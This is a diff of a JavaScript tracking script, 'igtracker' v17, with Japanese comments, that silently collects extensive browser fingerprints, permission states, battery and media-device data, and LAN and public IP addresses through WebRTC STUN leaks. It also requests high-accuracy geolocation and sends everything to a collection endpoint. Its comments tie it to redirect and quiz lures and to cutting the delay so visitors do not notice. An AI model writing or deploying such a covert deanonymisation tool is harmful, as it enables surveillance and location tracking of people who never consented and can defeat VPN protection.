@@ -1,8 +1,11 @@
-/* 訪問者識別コレクタ (igtracker) v16
+/* 訪問者識別コレクタ (igtracker) v17
    全モードで常に走る。端末キー署名・指紋・WebRTC・権限・時計・媒体まで全部集める。
    事前に window.LT_CODE / LT_HIT / LT_NONCE を定義。LT_GEO は既定 true。
 
-   v16: refreshHz の誤計測と clockSkew の算出を修正 */
+   v17: 収集を「速い段（同期）」と「遅い段（非同期）」に分割。
+        速い段は即送信、遅い段は解決ごとに個別 keepalive 送信。
+        LT.fast(cap) で収集完了を待てるので、転送モードでも待ち時間を最小化できる。
+        取得項目は v16 と同一。 */
 (function () {
   "use strict";
   const CODE = window.LT_CODE || "", HIT = window.LT_HIT || 0,
@@ -86,7 +89,7 @@
     return { vid, pub, sig };
   }
 
-  /* ---------- 指紋 ---------- */
+  /* ---------- 指紋（同期部分） ---------- */
   function canvasHash() {
     try {
       const c = document.createElement("canvas"); c.width = 280; c.height = 60;
@@ -143,6 +146,48 @@
       document.body.removeChild(s); return out.join(",");
     } catch (e) { return ""; }
   }
+  function codecs() {
+    try {
+      const v = document.createElement("video"), a = document.createElement("audio");
+      const t = (el, s) => el.canPlayType(s) || "";
+      return [t(v, 'video/mp4; codecs="avc1.42E01E"'), t(v, 'video/webm; codecs="vp9"'),
+        t(v, 'video/mp4; codecs="hvc1"'), t(v, 'video/webm; codecs="av01.0.05M.08"'),
+        t(a, "audio/mpeg"), t(a, 'audio/ogg; codecs="opus"'),
+        t(a, 'audio/mp4; codecs="mp4a.40.2"'), t(a, "audio/flac")].join(",");
+    } catch (e) { return ""; }
+  }
+  function mediaQuery(name, val) {
+    try { return matchMedia("(" + name + ":" + val + ")").matches ? 1 : 0; } catch (e) { return 0; }
+  }
+  function fpFast() {
+    const wg = webglInfo();
+    return {
+      ua: navigator.userAgent, platform: navigator.platform || "",
+      lang: (navigator.languages || [navigator.language]).join(","),
+      tz: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; } })(),
+      tzoff: new Date().getTimezoneOffset(),
+      screen: [screen.width, screen.height, screen.colorDepth, screen.pixelDepth].join("x"),
+      avail: [screen.availWidth, screen.availHeight].join("x"),
+      dpr: window.devicePixelRatio || 1,
+      cores: navigator.hardwareConcurrency || 0, mem: navigator.deviceMemory || 0,
+      touch: ("ontouchstart" in window) ? 1 : 0, maxTouch: navigator.maxTouchPoints || 0,
+      pdf: navigator.pdfViewerEnabled === undefined ? "" : (navigator.pdfViewerEnabled ? 1 : 0),
+      canvas: canvasHash(), webgl: wg.hash, gpu: wg.gpu, gpuVendor: wg.vendor,
+      fonts: fontList(), codecs: codecs(),
+      gamut: mediaQuery("color-gamut", "p3"), hdr: mediaQuery("dynamic-range", "high"),
+      dark: mediaQuery("prefers-color-scheme", "dark"),
+      motion: mediaQuery("prefers-reduced-motion", "reduce"),
+      hover: mediaQuery("hover", "hover"),
+      pointer: mediaQuery("pointer", "fine") ? "fine" : "coarse",
+      orientation: (screen.orientation && screen.orientation.type) || "",
+      cookies: navigator.cookieEnabled ? 1 : 0, dnt: navigator.doNotTrack || "",
+      plugins: Array.from(navigator.plugins || []).map((p) => p.name).join(","),
+      hist: history.length, ref: document.referrer || "",
+      win: innerWidth + "x" + innerHeight, frames: window.top !== window.self ? 1 : 0,
+    };
+  }
+
+  /* ---------- 指紋（非同期部分。項目ごとに個別送信） ---------- */
   function audioHash() {
     return new Promise((res) => {
       try {
@@ -164,28 +209,15 @@
       } catch (e) { res(""); }
     });
   }
-  function codecs() {
-    try {
-      const v = document.createElement("video"), a = document.createElement("audio");
-      const t = (el, s) => el.canPlayType(s) || "";
-      return [t(v, 'video/mp4; codecs="avc1.42E01E"'), t(v, 'video/webm; codecs="vp9"'),
-        t(v, 'video/mp4; codecs="hvc1"'), t(v, 'video/webm; codecs="av01.0.05M.08"'),
-        t(a, "audio/mpeg"), t(a, 'audio/ogg; codecs="opus"'),
-        t(a, 'audio/mp4; codecs="mp4a.40.2"'), t(a, "audio/flac")].join(",");
-    } catch (e) { return ""; }
-  }
-  function mediaQuery(name, val) {
-    try { return matchMedia("(" + name + ":" + val + ")").matches ? 1 : 0; } catch (e) { return 0; }
-  }
   function refreshHz() {
     return new Promise((res) => {
       let n = 0; const start = performance.now();
       function step(t) {
         n++;
-        if (t - start < 700) requestAnimationFrame(step);
+        if (t - start < 400) requestAnimationFrame(step);
         else res(Math.max(1, Math.round(n / ((t - start) / 1000))));
       }
-      try { requestAnimationFrame(step); setTimeout(() => res(0), 1200); } catch (e) { res(0); }
+      try { requestAnimationFrame(step); setTimeout(() => res(0), 700); } catch (e) { res(0); }
     });
   }
   async function clockSkew() {
@@ -255,8 +287,6 @@
     return { type: c.effectiveType || "", down: c.downlink || 0, rtt: c.rtt || 0,
              save: c.saveData ? 1 : 0 };
   }
-
-  /* WebRTC：LAN IP と公開IP を STUN で拾う */
   function webrtc() {
     return new Promise((res) => {
       const out = { lan: [], pub: [] };
@@ -276,81 +306,78 @@
           }
         };
         pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
-        setTimeout(() => { try { pc.close(); } catch (e) {} res(out); }, 2500);
+        setTimeout(() => { try { pc.close(); } catch (e) {} res(out); }, 1200);
       } catch (e) { res(out); }
     });
   }
 
-  async function fingerprint() {
-    const wg = webglInfo();
-    const f = {
-      ua: navigator.userAgent, platform: navigator.platform || "",
-      lang: (navigator.languages || [navigator.language]).join(","),
-      tz: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; } })(),
-      tzoff: new Date().getTimezoneOffset(),
-      screen: [screen.width, screen.height, screen.colorDepth, screen.pixelDepth].join("x"),
-      avail: [screen.availWidth, screen.availHeight].join("x"),
-      dpr: window.devicePixelRatio || 1,
-      cores: navigator.hardwareConcurrency || 0, mem: navigator.deviceMemory || 0,
-      touch: ("ontouchstart" in window) ? 1 : 0, maxTouch: navigator.maxTouchPoints || 0,
-      pdf: navigator.pdfViewerEnabled === undefined ? "" : (navigator.pdfViewerEnabled ? 1 : 0),
-      canvas: canvasHash(), webgl: wg.hash, gpu: wg.gpu, gpuVendor: wg.vendor,
-      fonts: fontList(), codecs: codecs(), audio: await withTimeout(audioHash(), 4000, ""),
-      gamut: mediaQuery("color-gamut", "p3"), hdr: mediaQuery("dynamic-range", "high"),
-      dark: mediaQuery("prefers-color-scheme", "dark"),
-      motion: mediaQuery("prefers-reduced-motion", "reduce"),
-      hover: mediaQuery("hover", "hover"), pointer: mediaQuery("pointer", "fine") ? "fine" : "coarse",
-      orientation: (screen.orientation && screen.orientation.type) || "",
-      cookies: navigator.cookieEnabled ? 1 : 0, dnt: navigator.doNotTrack || "",
-      plugins: Array.from(navigator.plugins || []).map((p) => p.name).join(","),
-      hist: history.length, ref: document.referrer || "",
-      win: innerWidth + "x" + innerHeight, frames: window.top !== window.self ? 1 : 0,
-      clockSkew: await withTimeout(clockSkew(), 2000, 0),
-      webgpu: await withTimeout(webgpu(), 3000, ""),
-      hz: await withTimeout(refreshHz(), 1500, 0),
-      perms: await withTimeout(permissions(), 2500, ""),
-      voices: voices(), storage: await withTimeout(storage(), 2000, ""),
-      devices: await withTimeout(devices(), 2500, ""),
-      rtc: await withTimeout(webrtc(), 3000, { lan: [], pub: [] }),
-    };
-    Object.assign(f, await withTimeout(battery(), 2000, {}));
-    Object.assign(f, netInfo());
-    return f;
-  }
-
   /* ---------- 送信 ---------- */
   let payload = {};
-  let ready = false;
+  let fp = {};
+  let fastDone = false;
+  let slowP = null;
 
-  async function collect() {
+  function commit(key, val, field) {
+    if (val == null || val === "" || (Array.isArray(val) && !val.length)) return;
+    fp[key] = val;
+    if (field) payload[field] = val;
+    send({ [field || key]: val });
+  }
+
+  async function collectFast() {
     let k = { vid: "", pub: "", sig: "" };
-    let fp = {};
-    try { k = await withTimeout(deviceKey(), 5000, k); } catch (e) {}
-    try { fp = await withTimeout(fingerprint(), 9000, {}); } catch (e) {}
-    const rtc = fp.rtc || { lan: [], pub: [] };
+    try { k = await withTimeout(deviceKey(), 3000, k); } catch (e) {}
+    fp = fpFast();
+    const rtc = { lan: [], pub: [] };
     payload = {
       hit_id: HIT, vid: k.vid, pubkey: k.pub, sig: k.sig,
-      fp_json: fp, fp: await withTimeout(sha256hex(JSON.stringify(fp)), 3000, ""),
+      fp_json: fp,
       screen: innerWidth + "x" + innerHeight + "@" + (devicePixelRatio || 1),
       platform: navigator.platform || "", cores: fp.cores || 0, mem: fp.mem || 0,
       touch: fp.maxTouch || 0, tz: fp.tz || "", tz_client: fp.tz || "",
       tzoff: fp.tzoff || 0, lang_list: fp.lang || "",
       lan_ip: (rtc.lan || []).join(","), pub_ip: (rtc.pub || []).join(","),
       gpu: fp.gpu || "", webgl_hash: fp.webgl || "", canvas_fp: fp.canvas || "",
-      audio_fp: fp.audio || "", fonts_n: (fp.fonts || "").split(",").filter(Boolean).length,
-      codecs: fp.codecs || "", media_devices: fp.devices || "",
-      storage: fp.storage || "", battery: fp.lvl != null ? fp.lvl : null,
-      charging: fp.chg != null ? fp.chg : null, net_type: fp.type || "",
-      downlink: fp.down || 0, rtt: fp.rtt || 0, clock_skew: fp.clockSkew || 0,
-      color_gamut: fp.gamut || 0, hdr: fp.hdr || 0, refresh_hz: fp.hz || 0,
+      audio_fp: "", fonts_n: (fp.fonts || "").split(",").filter(Boolean).length,
+      codecs: fp.codecs || "", media_devices: "", storage: "",
+      net_type: "", downlink: 0, rtt: 0, clock_skew: 0,
+      color_gamut: fp.gamut || 0, hdr: fp.hdr || 0, refresh_hz: 0,
       pointer: fp.pointer || "", orientation: fp.orientation || "",
       cookies_on: fp.cookies || 0, dnt: fp.dnt || "",
-      permissions: fp.perms || "", voices: fp.voices || "", webgpu: fp.webgpu || "",
-      plugins: fp.plugins || "",
+      permissions: "", voices: "", webgpu: "", plugins: fp.plugins || "",
     };
-    ready = true;
-    return payload;
+    fastDone = true;
   }
+
+  function collectSlow() {
+    const n = netInfo();
+    if (n.type) commit("netType", n.type, "net_type");
+    if (n.down) commit("downlink", n.down, "downlink");
+    if (n.rtt) commit("rtt", n.rtt, "rtt");
+    const jobs = [
+      withTimeout(audioHash(), 900, "").then((v) => commit("audio", v, "audio_fp")),
+      withTimeout(webrtc(), 1200, { lan: [], pub: [] }).then((r) => {
+        if ((r.lan || []).length) commit("lan", r.lan.join(","), "lan_ip");
+        if ((r.pub || []).length) commit("pub", r.pub.join(","), "pub_ip");
+      }),
+      withTimeout(webgpu(), 700, "").then((v) => commit("webgpu", v, "webgpu")),
+      withTimeout(permissions(), 700, "").then((v) => commit("perms", v, "permissions")),
+      Promise.resolve().then(() => commit("voices", voices(), "voices")),
+      withTimeout(storage(), 500, "").then((v) => commit("storage", v, "storage")),
+      withTimeout(devices(), 700, "").then((v) => commit("devices", v, "media_devices")),
+      withTimeout(battery(), 600, {}).then((b) => {
+        if (b.lvl != null) { fp.lvl = b.lvl; payload.battery = b.lvl; send({ battery: b.lvl }); }
+        if (b.chg != null) { fp.chg = b.chg; payload.charging = b.chg; send({ charging: b.chg }); }
+      }),
+      withTimeout(clockSkew(), 800, 0).then((v) => commit("clockSkew", v, "clock_skew")),
+      withTimeout(refreshHz(), 800, 0).then((v) => commit("hz", v, "refresh_hz")),
+    ];
+    return Promise.allSettled(jobs).then(() => {
+      payload.fp_json = fp;
+      return send();
+    });
+  }
+
   async function send(fields) {
     try {
       await fetch("/l/" + CODE + "/x", {
@@ -359,6 +386,7 @@
       });
     } catch (e) {}
   }
+
   function geo() {
     const LADDER = [
       { enableHighAccuracy: true,  timeout: 9000,  maximumAge: 0 },
@@ -422,22 +450,39 @@
   }
 
   async function boot() {
-    try { await collect(); } catch (e) {}
+    try { await collectFast(); } catch (e) { fastDone = true; }
     try { await send(); } catch (e) {}
+    slowP = collectSlow();
     if (GEO) { try { send(await geo()); } catch (e) {} }
     try { beacon(); } catch (e) {}
     window.LT_PAYLOAD = payload;
     if (typeof window.LT_READY === "function") { try { window.LT_READY(payload); } catch (e) {} }
   }
+
   window.LT = {
-    payload: () => payload, send, collect, geo, sha256hex,
-    ready: () => ready,
-    /* 収集完了を待ってから実行（クイズ回答やリダイレクト前に使う） */
-    wait: (ms) => new Promise((res) => {
+    payload: () => payload, send, collect: collectFast, geo, sha256hex,
+    ready: () => fastDone,
+    /* 速い段の完了を待つ（待ち時間 0 用） */
+    fast: () => new Promise((res) => {
+      if (fastDone) return res(true);
       const t = Date.now();
       (function loop() {
-        if (ready || Date.now() - t > (ms || 4000)) return res(ready);
-        setTimeout(loop, 100);
+        if (fastDone || Date.now() - t > 2500) return res(fastDone);
+        setTimeout(loop, 30);
+      })();
+    }),
+    /* 遅い段も含めて待つ。cap で打ち切り */
+    wait: (ms) => new Promise((res) => {
+      const t = Date.now();
+      const cap = ms || 4000;
+      (function loop() {
+        if (Date.now() - t > cap) return res(false);
+        if (slowP && fastDone) {
+          let done = false;
+          slowP.then(() => { done = true; });
+          setTimeout(() => { if (done) res(true); }, 0);
+        }
+        setTimeout(loop, 50);
       })();
     }),
   };
